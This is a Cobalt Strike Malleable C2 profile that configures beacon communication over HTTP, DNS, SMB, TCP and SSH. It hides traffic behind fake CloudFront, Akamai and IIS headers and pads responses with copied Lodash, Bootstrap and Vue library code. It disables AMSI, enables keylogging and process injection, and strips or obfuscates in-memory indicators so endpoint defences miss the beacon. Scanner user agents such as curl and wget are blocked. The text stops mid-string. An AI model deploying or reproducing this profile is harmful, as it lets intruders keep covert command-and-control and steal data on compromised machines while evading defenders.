################################################
# Cobalt Strike Malleable C2 Profile
# Version: Cobalt Strike 4.7
# Date   : 20260611_0843

################################################
## Profile Name
################################################
set sample_name "RMUJSAZQ";

################################################
## Sleep Times
################################################
set sleeptime "2";
set jitter    "36";           

################################################
##  Server Response Size jitter
################################################
set data_jitter "135"; # Append random-length string (up to data_jitter value) to http-get and http-post server output.        

################################################
##  HTTP Client Header Removal
################################################
# set headers_remove "Strict-Transport-Security"; # Comma-separated list of HTTP client headers to remove from Beacon C2.

################################################
## Beacon User-Agent
################################################
set useragent "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)";

################################################
## SSL CERTIFICATE
################################################
https-certificate { # Simple self signed certificate data
    
    set C   "SI";
    set CN  "v2.34.org";
    set O   "ls";
    set OU  "Graphics legal";
    set validity "365";
}

################################################
## Task and Proxy Max Size
################################################
set tasks_max_size "1048576";
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";  

################################################
## Access Token controls
## Added in 4.7
## Allows control over how access tokens are permissioned
# https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/post-exploitation_trust-relationships.htm
set steal_token_access_mask "11";
################################################

################################################
## TCP Beacon
################################################
set tcp_port "8013"; # TCP beacion listen port
set tcp_frame_header "\x89\xf7\x68\xd7\x96\xbb\x70\x6b\x75\x5f"; # Prepend header to TCP Beacon messages

################################################
## SMB beacons
################################################
set pipename         "WiFiNetMgrKCUO_##"; # Name of pipe for SSH sessions. Each # is replaced with a random hex value.
set pipename_stager  "RPC_XKLG##"; # Name of pipe to use for SMB Beacon's named pipe stager. Each # is replaced with a random hex value.
set smb_frame_header "\xe3\xb0\x88\xf8\xcd\x8b\x59\x6a\x9e\xc0"; # Prepend header to SMB Beacon messages

################################################
## DNS beacons
################################################
dns-beacon {
    # Options moved into "dns-beacon" group in version 4.3
    set dns_idle           "108.188.218.251"; # IP address used to indicate no tasks are available to DNS Beacon; Mask for other DNS C2 values
    set dns_max_txt        "252"; # Maximum length of DNS TXT responses for tasks
    set dns_sleep          "47"; # Force a sleep prior to each individual DNS request. (in milliseconds) 
    set dns_ttl            "4"; # TTL for DNS replies
    set maxdns             "251"; # Maximum length of hostname when uploading data over DNS (0-255)
    set dns_stager_prepend ".fni."; # Maximum length of hostname when uploading data over DNS (0-255)
    set dns_stager_subhost ".dkv8fbf."; # Subdomain used by DNS TXT record stager.
    set beacon             "g."; # 8 Char max recommended. DNS subhost prefix
    set get_A              "3nv2."; # 8 Char max recommended. DNS subhost prefix
    set get_AAAA           "vic."; # 8 Char max recommended. DNS subhost prefix
    set get_TXT            "kcm."; # 8 Char max recommended. DNS subhost prefix
    set put_metadata       "mzyez8."; # 8 Char max recommended. DNS subhost prefix
    set put_output         "lgbf."; # 8 Char max recommended. DNS subhost prefix
    set ns_response        "zero"; # How to process NS Record requests. "drop" does not respond to the request (default), "idle" responds with A record for IP address from "dns_idle", "zero" responds with A record for 0.0.0.0

}

################################################
## SSH beacons
################################################
set ssh_banner        "SSH-2.0-OpenSSH_4.2p6 Ubuntu"; # SSH client banner
set ssh_pipename      "WkSvcPipeMgr_WUDK##"; # Name of pipe for SSH sessions. Each # is replaced with a random hex value.


################################################
## Staging process
################################################
set host_stage "true"; 

http-stager { # Reference: https://www.cobaltstrike.com/help-malleable-c2
    set uri_x86 "/Queue/index_01/Y9NN5C0O1"; # URI for x86 staging
    set uri_x64 "/Read/browser/2UEHAP7XO"; # URI for x64 staging

    server {
        header "Server" "CloudFront";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/json; charset=utf-8";
        output {
            prepend "
/**
 * @license
 * Lodash <https://lodash.com/>
 * Copyright OpenJS Foundation and other contributors <https://openjsf.org/>
 * Released under MIT license <https://lodash.com/license>
 * Based on Underscore.js 1.8.3 <http://underscorejs.org/LICENSE>
 * Copyright Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
 */
(function(){function n(n,t,r){switch(r.length){case 0:return n.call(t);case 1:return n.call(t,r[0]);case 2:return n.call(t,r[0],r[1]);case 3:return n.call(t,r[0],r[1],r[2])}return n.apply(t,r)}function t(n,t,r,e){for(var u=-1,i=null==n?0:n.length;++u<i;){var o=n[u];t(e,o,r(o),n)}return e}function r(n,t){for(var r=-1,e=null==n?0:n.length;++r<e&&t(n[r],r,n)!==!1;);return n}function e(n,t){for(var r=null==n?0:n.length;r--&&t(n[r],r,n)!==!1;);return n}function u(n,t){for(var r=-1,e=null==n?0:n.length;++r<e;)if(!t(n[r],r,n))return!1;
return!0}function i(n,t){for(var r=-1,e=null==n?0:n.length,u=0,i=[];++r<e;){var o=n[r];t(o,r,n)&&(i[u++]=o)}return i}function o(n,t){return!!(null==n?0:n.length)&&y(n,t,0)>-1}function f(n,t,r){for(var e=-1,u=null==n?0:n.length;++e<u;)if(r(t,n[e]))return!0;return!1}function c(n,t){for(var r=-1,e=null==n?0:n.length,u=Array(e);++r<e;)u[r]=t(n[r],r,n);return u}function a(n,t){for(var r=-1,e=t.length,u=n.length;++r<e;)n[u+r]=t[r];return n}function l(n,t,r,e){var u=-1,i=null==n?0:n.length;for(e&&i&&(r=n[++u]);++u<i;)r=t(r,n[u],u,n);
return r}function s(n,t,r,e){var u=null==n?0:n.length;for(e&&u&&(r=n[--u]);u--;)r=t(r,n[u],u,n);return r}function h(n,t){for(var r=-1,e=null==n?0:n.length;++r<e;)if(t(n[r],r,n))return!0;return!1}function p(n){return n.split(\"\")}function _(n){return n.match($t)||[]}function v(n,t,r){var e;return r(n,function(n,r,u){if(t(n,r,u))return e=r,!1}),e}function g(n,t,r,e){for(var u=n.length,i=r+(e?1:-1);e?i--:++i<u;)if(t(n[i],i,n))return i;return-1}function y(n,t,r){return t===t?Z(n,t,r):g(n,b,r)}function d(n,t,r,e){
for(var u=r-1,i=n.length;++u<i;)if(e(n[u],t))return u;return-1}function b(n){return n!==n}function w(n,t){var r=null==n?0:n.length;return r?k(n,t)/r:Cn}function m(n){return function(t){return null==t?X:t[n]}}function x(n){return function(t){return null==n?X:n[t]}}function j(n,t,r,e,u){return u(n,function(n,u,i){r=e?(e=!1,n):t(r,n,u,i)}),r}function A(n,t){var r=n.length;for(n.sort(t);r--;)n[r]=n[r].value;return n}function k(n,t){for(var r,e=-1,u=n.length;++e<u;){var i=t(n[e]);i!==X&&(r=r===X?i:r+i);
}return r}function O(n,t){for(var r=-1,e=Array(n);++r<n;)e[r]=t(r);return e}function I(n,t){return c(t,function(t){return[t,n[t]]})}function R(n){return n?n.slice(0,H(n)+1).replace(Lt,\"\"):n}function z(n){return function(t){return n(t)}}function E(n,t){return c(t,function(t){return n[t]})}function S(n,t){return n.has(t)}function W(n,t){for(var r=-1,e=n.length;++r<e&&y(t,n[r],0)>-1;);return r}function L(n,t){for(var r=n.length;r--&&y(t,n[r],0)>-1;);return r}function C(n,t){for(var r=n.length,e=0;r--;)n[r]===t&&++e;
return e}function U(n){return\"\\\"+Yr[n]}function B(n,t){return null==n?X:n[t]}function T(n){return Nr.test(n)}function $(n){return Pr.test(n)}function D(n){for(var t,r=[];!(t=n.next()).done;)r.push(t.value);return r}function M(n){var t=-1,r=Array(n.size);return n.forEach(function(n,e){r[++t]=[e,n]}),r}function F(n,t){return function(r){return n(t(r))}}function N(n,t){for(var r=-1,e=n.length,u=0,i=[];++r<e;){var o=n[r];o!==t&&o!==cn||(n[r]=cn,i[u++]=r)}return i}function P(n){var t=-1,r=Array(n.size);
return n.forEach(function(n){r[++t]=n}),r}function q(n){var t=-1,r=Array(n.size);return n.forEach(function(n){r[++t]=[n,n]}),r}function Z(n,t,r){for(var e=r-1,u=n.length;++e<u;)if(n[e]===t)return e;return-1}function K(n,t,r){for(var e=r+1;e--;)if(n[e]===t)return e;return e}function V(n){return T(n)?J(n):_e(n)}function G(n){return T(n)?Y(n):p(n)}function H(n){for(var t=n.length;t--&&Ct.test(n.charAt(t)););return t}function J(n){for(var t=Mr.lastIndex=0;Mr.test(n);)++t;return t}function Y(n){return n.match(Mr)||[];
}function Q(n){return n.match(Fr)||[]}var X,nn=\"4.17.21\",tn=200,rn=\"Unsupported core-js use. Try https://npms.io/search?q=ponyfill.\",en=\"Expected a function\",un=\"Invalid `variable` option passed into `_.template`\",on=\"__lodash_hash_undefined__\",fn=500,cn=\"__lodash_placeholder__\",an=1,ln=2,sn=4,hn=1,pn=2,_n=1,vn=2,gn=4,yn=8,dn=16,bn=32,wn=64,mn=128,xn=256,jn=512,An=30,kn=\"...\",On=800,In=16,Rn=1,zn=2,En=3,Sn=1/0,Wn=9007199254740991,Ln=1.7976931348623157e308,Cn=NaN,Un=4294967295,Bn=Un-1,Tn=Un>>>1,$n=[[\"ary\",mn],[\"bind\",_n],[\"bindKey\",vn],[\"curry\",yn],[\"curryRight\",dn],[\"flip\",jn],[\"partial\",bn],[\"partialRight\",wn],[\"rearg\",xn]],Dn=\"[object Arguments]\",Mn=\"[object Array]\",Fn=\"[object AsyncFunction]\",Nn=\"[object Boolean]\",Pn=\"[object Date]\",qn=\"[object DOMException]\",Zn=\"[object Error]\",Kn=\"[object Function]\",Vn=\"[object GeneratorFunction]\",Gn=\"[object Map]\",Hn=\"[object Number]\",Jn=\"[object Null]\",Yn=\"[object Object]\",Qn=\"[object Promise]\",Xn=\"[object Proxy]\",nt=\"[object RegExp]\",tt=\"[object Set]\",rt=\"[object String]\",et=\"[object Symbol]\",ut=\"[object Undefined]\",it=\"[object WeakMap]\",ot=\"[object WeakSet]\",ft=\"[object ArrayBuffer]\",ct=\"[object DataView]\",at=\"[object Float32Array]\",lt=\"[object Float64Array]\",st=\"[object Int8Array]\",ht=\"[object Int16Array]\",pt=\"[object Int32Array]\",_t=\"[object Uint8Array]\",vt=\"[object Uint8ClampedArray]\",gt=\"[object Uint16Array]\",yt=\"[object Uint32Array]\",dt=/__p \\+= '';/g,bt=/(__p \\+=) '' \\+/g,wt=/(__e\\(.*?\\)|__t\\)) \\+
'';/g,mt=/&(?:amp|lt|gt|quot|#39);/g,xt=/[&<>\"']/g,jt=RegExp(mt.source),At=RegExp(xt.source),kt=/<%-([\\s\\S]+?)%>/g,Ot=/<%([\\s\\S]+?)%>/g,It=/<%=([\\s\\S]+?)%>/g,Rt=/\\.|\\[(?:[^[\\]]*|([\"'])(?:(?!)[^\\]|\\.)*?)\\]/,zt=/^\\w*$/,Et=/[^.[\\]]+|\\[(?:(-?\\d+(?:\\.\\d+)?)|([\"'])((?:(?!)[^\\]|\\.)*?))\\]|(?=(?:\\.|\\[\\])(?:\\.|\\[\\]|$))/g,St=/[\\^$.*+?()[\\]{}|]/g,Wt=RegExp(St.source),Lt=/^\\s+/,Ct=/\\s/,Ut=/\\{(?:
\\/\\* \\[wrapped with .+\\] \\*\\/)?
?/,Bt=/\\{
\\/\\* \\[wrapped with (.+)\\] \\*/,Tt=/,? & /,$t=/[^ -/:-@[-`{-]+/g,Dt=/[()=,{}\\[\\]\\/\\s]/,Mt=/\\(\\)?/g,Ft=/\\$\\{([^\\}]*(?:\\.[^\\}]*)*)\\}/g,Nt=/\\w*$/,Pt=/^[-+]0x[0-9a-f]+$/i,qt=/^0b[01]+$/i,Zt=/^\\[object .+?Constructor\\]$/,Kt=/^0o[0-7]+$/i,Vt=/^(?:0|[1-9]\\d*)$/,Gt=/[----]/g,Ht=/($^)/,Jt=/['

\\]/g,Yt=\"\\ud800-\\udfff\",Qt=\"\\u0300-\\u036f\",Xt=\"\\ufe20-\\ufe2f\",nr=\"\\u20d0-\\u20ff\",tr=Qt+Xt+nr,rr=\"\\u2700-\\u27bf\",er=\"a-z\\xdf-\\xf6\\xf8-\\xff\",ur=\"\\xac\\xb1\\xd7\\xf7\",ir=\"\\x00-\\x2f\\x3a-\\x40\\x5b-\\x60\\x7b-\\xbf\",or=\"\\u2000-\\u206f\",fr=\" \\t\\x0b\\f\\xa0\\ufeff\\n\\r\\u2028\\u2029\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000\",cr=\"A-Z\\xc0-\\xd6\\xd8-\\xde\",ar=\"\\ufe0e\\ufe0f\",lr=ur+ir+or+fr,sr=\"[']\",hr=\"[\"+Yt+\"]\",pr=\"[\"+lr+\"]\",_r=\"[\"+tr+\"]\",vr=\"\\d+\",gr=\"[\"+rr+\"]\",yr=\"[\"+er+\"]\",dr=\"[^\"+Yt+lr+vr+rr+er+cr+\"]\",br=\"\\ud83c[\\udffb-\\udfff]\",wr=\"(?:\"+_r+\"|\"+br+\")\",mr=\"[^\"+Yt+\"]\",xr=\"(?:\\ud83c[\\udde6-\\uddff]){2}\",jr=\"[\\ud800-\\udbff][\\udc00-\\udfff]\",Ar=\"[\"+cr+\"]\",kr=\"\\u200d\",Or=\"(?:\"+yr+\"|\"+dr+\")\",Ir=\"(?:\"+Ar+\"|\"+dr+\")\",Rr=\"(?:\"+sr+\"(?:d|ll|m|re|s|t|ve))?\",zr=\"(?:\"+sr+\"(?:D|LL|M|RE|S|T|VE))?\",Er=wr+\"?\",Sr=\"[\"+ar+\"]?\",Wr=\"(?:\"+kr+\"(?:\"+[mr,xr,jr].join(\"|\")+\")\"+Sr+Er+\")*\",Lr=\"\\d*(?:1st|2nd|3rd|(?![123])\\dth)(?=\\b|[A-Z_])\",Cr=\"\\d*(?:1ST|2ND|3RD|(?![123])\\dTH)(?=\\b|[a-z_])\",Ur=Sr+Er+Wr,Br=\"(?:\"+[gr,xr,jr].join(\"|\")+\")\"+Ur,Tr=\"(?:\"+[mr+_r+\"?\",_r,xr,jr,hr].join(\"|\")+\")\",$r=RegExp(sr,\"g\"),Dr=RegExp(_r,\"g\"),Mr=RegExp(br+\"(?=\"+br+\")|\"+Tr+Ur,\"g\"),Fr=RegExp([Ar+\"?\"+yr+\"+\"+Rr+\"(?=\"+[pr,Ar,\"$\"].join(\"|\")+\")\",Ir+\"+\"+zr+\"(?=\"+[pr,Ar+Or,\"$\"].join(\"|\")+\")\",Ar+\"?\"+Or+\"+\"+Rr,Ar+\"+\"+zr,Cr,Lr,vr,Br].join(\"|\"),\"g\"),Nr=RegExp(\"[\"+kr+Yt+tr+ar+\"]\"),Pr=/[a-z][A-Z]|[A-Z]{2}[a-z]|[0-9][a-zA-Z]|[a-zA-Z][0-9]|[^a-zA-Z0-9 ]/,qr=[\"Array\",\"Buffer\",\"DataView\",\"Date\",\"Error\",\"Float32Array\",\"Float64Array\",\"Function\",\"Int8Array\",\"Int16Array\",\"Int32Array\",\"Map\",\"Math\",\"Object\",\"Promise\",\"RegExp\",\"Set\",\"String\",\"Symbol\",\"TypeError\",\"Uint8Array\",\"Uint8ClampedArray\",\"Uint16Array\",\"Uint32Array\",\"WeakMap\",\"_\",\"clearTimeout\",\"isFinite\",\"parseInt\",\"setTimeout\"],Zr=-1,Kr={
";
            append "
/*!
  * Bootstrap v5.2.3 (https://getbootstrap.com/)
  * Copyright 2011-2022 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)
  * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
  */
!function(t,e){\"object\"==typeof exports&&\"undefined\"!=typeof module?module.exports=e(require(\"@popperjs/core\")):\"function\"==typeof define&&define.amd?define([\"@popperjs/core\"],e):(t=\"undefined\"!=typeof globalThis?globalThis:t||self).bootstrap=e(t.Popper)}(this,(function(t){\"use strict\";function e(t){if(t&&t.__esModule)return t;const e=Object.create(null,{[Symbol.toStringTag]:{value:\"Module\"}});if(t)for(const i in t)if(\"default\"!==i){const s=Object.getOwnPropertyDescriptor(t,i);Object.defineProperty(e,i,s.get?s:{enumerable:!0,get:()=>t[i]})}return e.default=t,Object.freeze(e)}const i=e(t),s=\"transitionend\",n=t=>{let e=t.getAttribute(\"data-bs-target\");if(!e||\"#\"===e){let i=t.getAttribute(\"href\");if(!i||!i.includes(\"#\")&&!i.startsWith(\".\"))return null;i.includes(\"#\")&&!i.startsWith(\"#\")&&(i=`#${i.split(\"#\")[1]}`),e=i&&\"#\"!==i?i.trim():null}return e},o=t=>{const e=n(t);return e&&document.querySelector(e)?e:null},r=t=>{const e=n(t);return e?document.querySelector(e):null},a=t=>{t.dispatchEvent(new Event(s))},l=t=>!(!t||\"object\"!=typeof t)&&(void 0!==t.jquery&&(t=t[0]),void 0!==t.nodeType),c=t=>l(t)?t.jquery?t[0]:t:\"string\"==typeof t&&t.length>0?document.querySelector(t):null,h=t=>{if(!l(t)||0===t.getClientRects().length)return!1;const e=\"visible\"===getComputedStyle(t).getPropertyValue(\"visibility\"),i=t.closest(\"details:not([open])\");if(!i)return e;if(i!==t){const e=t.closest(\"summary\");if(e&&e.parentNode!==i)return!1;if(null===e)return!1}return e},d=t=>!t||t.nodeType!==Node.ELEMENT_NODE||!!t.classList.contains(\"disabled\")||(void 0!==t.disabled?t.disabled:t.hasAttribute(\"disabled\")&&\"false\"!==t.getAttribute(\"disabled\")),u=t=>{if(!document.documentElement.attachShadow)return null;if(\"function\"==typeof t.getRootNode){const e=t.getRootNode();return e instanceof ShadowRoot?e:null}return t instanceof ShadowRoot?t:t.parentNode?u(t.parentNode):null},_=()=>{},g=t=>{t.offsetHeight},f=()=>window.jQuery&&!document.body.hasAttribute(\"data-bs-no-jquery\")?window.jQuery:null,p=[],m=()=>\"rtl\"===document.documentElement.dir,b=t=>{var e;e=()=>{const e=f();if(e){const i=t.NAME,s=e.fn[i];e.fn[i]=t.jQueryInterface,e.fn[i].Constructor=t,e.fn[i].noConflict=()=>(e.fn[i]=s,t.jQueryInterface)}},\"loading\"===document.readyState?(p.length||document.addEventListener(\"DOMContentLoaded\",(()=>{for(const t of p)t()})),p.push(e)):e()},v=t=>{\"function\"==typeof t&&t()},y=(t,e,i=!0)=>{if(!i)return void v(t);const n=(t=>{if(!t)return 0;let{transitionDuration:e,transitionDelay:i}=window.getComputedStyle(t);const s=Number.parseFloat(e),n=Number.parseFloat(i);return s||n?(e=e.split(\",\")[0],i=i.split(\",\")[0],1e3*(Number.parseFloat(e)+Number.parseFloat(i))):0})(e)+5;let o=!1;const r=({target:i})=>{i===e&&(o=!0,e.removeEventListener(s,r),v(t))};e.addEventListener(s,r),setTimeout((()=>{o||a(e)}),n)},w=(t,e,i,s)=>{const n=t.length;let o=t.indexOf(e);return-1===o?!i&&s?t[n-1]:t[0]:(o+=i?1:-1,s&&(o=(o+n)%n),t[Math.max(0,Math.min(o,n-1))])},A=/[^.]*(?=\\..*)\\.|.*/,E=/\\..*/,C=/::\\d+$/,T={};let k=1;const L={mouseenter:\"mouseover\",mouseleave:\"mouseout\"},O=
";
            print;
            
        }
    }

    client {
        header "Accept" "text/html, image/*, application/xml";
        header "Accept-Language" "sv-fi";
        header "Accept-Encoding" "*, gzip";
    }
}

################################################
## Post Exploitation
################################################
post-ex { # Reference: https://www.cobaltstrike.com/help-malleable-postex
    set spawnto_x86 "%windir%\\syswow64\\DevicePairingWizard.exe";
    set spawnto_x64 "%windir%\\sysnative\\grpconv.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set pipename "ProtectionManager_##, Winsock2\\CatalogChangeListener-##-##, Spool\\pipe_##, WkSvcPipeMgr_##, NetClient_##, RPC_##, WiFiNetMgr_##, AuthPipeD_##";
    set keylogger "GetAsyncKeyState"; # options are GetAsyncKeyState or SetWindowsHookEx
    #set thread_hint ""; # specify as module!function+0x##
}


################################################
## Memory Indicators
################################################
stage { # https://www.cobaltstrike.com/help-malleable-postex
    # allocator and RWX settings (Note: HealAlloc uses RXW)
    
    set allocator      "HeapAlloc";
    set userwx         "true";
     
    set magic_mz_x86   "]U]U";
    set magic_mz_x64   "AYAQ";
    set magic_pe       "FR";
    set stomppe        "true";
    set obfuscate      "true"; # review sleepmask and UDRL considerations for obfuscate
    set cleanup        "true";
    set sleep_mask     "true";
    set smartinject    "true";
    set checksum       "0";
    set compile_time   "16 Oct 2011 03:44:02";
    set entry_point    "759723";
    set image_size_x86 "543164";
    set image_size_x64 "570380";
    set name           "v7.63.dll";
    set rich_header    "\x44\x61\x61\x53\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5b\xaa\x9b\x7c\x80\x55\xc7\x59\xf0\xcd\x5b\xbd\x8c\x7e\xa5\xbf\xb1\x82\xf6\x7d\xa2\x9f\xea\x5d\xf4\xc4\x5e\xda\xe7\x89\x5e\x56\xeb\x95\xb5\x7a\x51\xd0\xd3\xee\xa0\xd5\x95\xf6\xdf\xb2\xee\xb2\xeb\x5e\xb0\x80\xb1\xa6\xec\x90\xb1\xe0\x6a\xb0\x9a\xfa\xdd\x76\x8a\xaa\x6b\x7b\xa1\xe0\x82\xd0\x52\x69\x63\x68\x7a\xf9\x90\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

    ## WARNING: Module stomping 
    # set module_x86 "netshell.dll"; # Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc.
    # set module_x64 "netshell.dll"; # Same as module_x86; affects x64 loader

    # The transform-x86 and transform-x64 blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
    transform-x86 { # blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
        prepend "\x0f\x1f\x40\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x40\x00\x0f\x1f\x80\x00\x00\x00\x00\x50\x58\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x00\x0f\x1f\x44\x00\x00\x0f\x1f\x80\x00\x00\x00\x00\x66\x90\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x40\x00\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x50\x58\x66\x0f\x1f\x44\x00\x00\x66\x90"; # prepend nops
        strrep "ReflectiveLoader" "v2.36";
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "beacon.dll" ""; # Remove this text
    }
    transform-x64 { #blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
        prepend "\x0f\x1f\x84\x00\x00\x00\x00\x00\x50\x58\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x00\x0f\x1f\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x50\x58\x0f\x1f\x40\x00\x66\x0f\x1f\x44\x00\x00\x90\x0f\x1f\x80\x00\x00\x00\x00\x66\x90\x66\x0f\x1f\x44\x00\x00"; # prepend nops
        strrep "ReflectiveLoader" "desktops";
        strrep "beacon.x64.dll" ""; # Remove this text in the Beacon DLL
    }

    stringw "RMUJSAZQ"; # Add profile name to tag payloads to this profile
}

################################################
## Process Injection
################################################
process-inject { # Reference: https://www.cobaltstrike.com/help-malleable-postex

    # 4.7 BOF settings
    # set how memory is allocated in the current process for BOF content
    # https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend_process-injection.htm?Highlight=bof_allocator
    set bof_allocator "HeapAlloc";
    set bof_reuse_memory "true";

    set allocator "VirtualAllocEx"; # Options: VirtualAllocEx, NtMapViewOfSection 
    set min_alloc "18131"; # 	Minimum amount of memory to request for injected content
    set startrwx "false"; # Use RWX as initial permissions for injected content. Alternative is RW.
    
    # review sleepmask and UDRL considerations for userwx
    set userwx   "false"; # Use RWX as final permissions for injected content. Alternative is RX.

    transform-x86 { 
        # Make sure that prepended data is valid code for the injected content's architecture (x86, x64). The c2lint program does not have a check for this.
        prepend "\x0f\x1f\x44\x00\x00\x66\x90\x0f\x1f\x44\x00\x00\x0f\x1f\x44\x00\x00\x0f\x1f\x40\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x44\x00\x00\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x80\x00\x00\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x40\x00\x66\x0f\x1f\x44\x00\x00\x0f\x1f\x40\x00\x90\x90\x90\x0f\x1f\x44\x00\x00";
        append "\x66\x0f\x1f\x44\x00\x00\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x00\x66\x90\x66\x90\x66\x0f\x1f\x44\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x90\x66\x90\x0f\x1f\x00\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x90\x0f\x1f\x00\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x50\x58\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x44\x00\x00";
    }

    transform-x64 {
        # Make sure that prepended data is valid code for the injected content's architecture (x86, x64). The c2lint program does not have a check for this.
        prepend "\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x90\x0f\x1f\x80\x00\x00\x00\x00\x66\x90\x0f\x1f\x80\x00\x00\x00\x00";
        append "\x0f\x1f\x40\x00\x66\x0f\x1f\x44\x00\x00\x0f\x1f\x00\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x40\x00\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x40\x00\x90\x0f\x1f\x00\x66\x0f\x1f\x44\x00\x00\x66\x90\x66\x90\x0f\x1f\x84\x00\x00\x00\x00\x00";
    }
  
    execute {
        # The execute block controls the methods Beacon will use when it needs to inject code into a process. Beacon examines each option in the execute block, determines if the option is usable for the current context, tries the method when it is usable, and moves on to the next option if code execution did not happen. 
        
        CreateThread "ntdll!RtlUserThreadStart+0x470";
        CreateThread;
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread; 
    
    }
}

################################################
## HTTP Headers
################################################
http-config { # The http-config block has influence over all HTTP responses served by Cobalt Strike’s web server. 
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "AkamaiGHost";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
    # Use this option if your teamserver is behind a redirector
    set trust_x_forwarded_for "true";
    # Block Specific User Agents with a 404 (added in 4.3)
    set block_useragents "curl*,lynx*,wget*";
    # Allow Specific User Agents (added in 4.4);
    # allow_useragents ""; (if specified, block_useragents will take precedence)
}

################################################
## HTTP GET
################################################
http-get { # Don't think of this in terms of HTTP POST, but as a beacon transaction of pushing data to the server

    set uri "/update/v9.48/A6OJOOM9J"; # URI used for GET requests
    set verb "GET"; 

    client {

        header "Accept" "application/json, text/html, image/*";
        header "Accept-Language" "ar-ae";
        header "Accept-Encoding" "compress, br";

        metadata {
            mask; # Transform type
            netbios; # Transform type
            prepend "MLBG_AOBHF94CILA87UGE2IEEG3D5J6EB3MC3="; # Cookie value
            header "Cookie";                                  # Cookie header
        }
    }

    server {

        header "Server" "Microsoft-IIS/10.0";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/json; charset=utf-8";
        output {
            mask; # Transform type
            base64url; # Transform type
            prepend "
!function(e,t){\"object\"==typeof exports&&\"object\"==typeof module?module.exports=t(require(\"vue\")):\"function\"==typeof define&&define.amd?define(\"ELEMENT\",[\"vue\"],t):\"object\"==typeof exports?exports.ELEMENT=t(require(\"vue\")):e.ELEMENT=t(e.Vue)}(\"undefined\"!=typeof self?self:this,function(n){return i=[function(e,t){e.exports=n},function(e,t,n){var i=n(4);e.exports=function(e,t,n){return void 0===n?i(e,t,!1):i(e,n,!1!==t)}},function(f,m,g){var v;!function(){\"use strict\";function e(){}var u={},c=/d{1,4}|M{1,4}|yy(?:yy)?|S{1,3}|Do|ZZ|([HhMsDm])?|[aA]|\"[^\"]*\"|'[^']*'/g,t=\"[^\\s]+\",h=/\\[([^]*?)\\]/gm;function n(e,t){for(var n=[],i=0,r=e.length;i<r;i++)n.push(e[i].substr(0,t));return n}function i(i){return function(e,t,n){n=n[i].indexOf(t.charAt(0).toUpperCase()+t.substr(1).toLowerCase());~n&&(e.month=n)}}function r(e,t){for(e=String(e),t=t||2;e.length<t;)e=\"0\"+e;return e}var o=[\"Sunday\",\"Monday\",\"Tuesday\",\"Wednesday\",\"Thursday\",\"Friday\",\"Saturday\"],s=[\"January\",\"February\",\"March\",\"April\",\"May\",\"June\",\"July\",\"August\",\"September\",\"October\",\"November\",\"December\"],a=n(s,3),l=n(o,3),d=(u.i18n={dayNamesShort:l,dayNames:o,monthNamesShort:a,monthNames:s,amPm:[\"am\",\"pm\"],DoFn:function(e){return e+[\"th\",\"st\",\"nd\",\"rd\"][3<e%10?0:(e-e%10!=10)*e%10]}},{D:function(e){return e.getDay()},DD:function(e){return r(e.getDay())},Do:function(e,t){return t.DoFn(e.getDate())},d:function(e){return e.getDate()},dd:function(e){return r(e.getDate())},ddd:function(e,t){return t.dayNamesShort[e.getDay()]},dddd:function(e,t){return t.dayNames[e.getDay()]},M:function(e){return e.getMonth()+1},MM:function(e){return r(e.getMonth()+1)},MMM:function(e,t){return t.monthNamesShort[e.getMonth()]},MMMM:function(e,t){return t.monthNames[e.getMonth()]},yy:function(e){return r(String(e.getFullYear()),4).substr(2)},yyyy:function(e){return r(e.getFullYear(),4)},h:function(e){return e.getHours()%12||12},hh:function(e){return r(e.getHours()%12||12)},H:function(e){return e.getHours()},HH:function(e){return 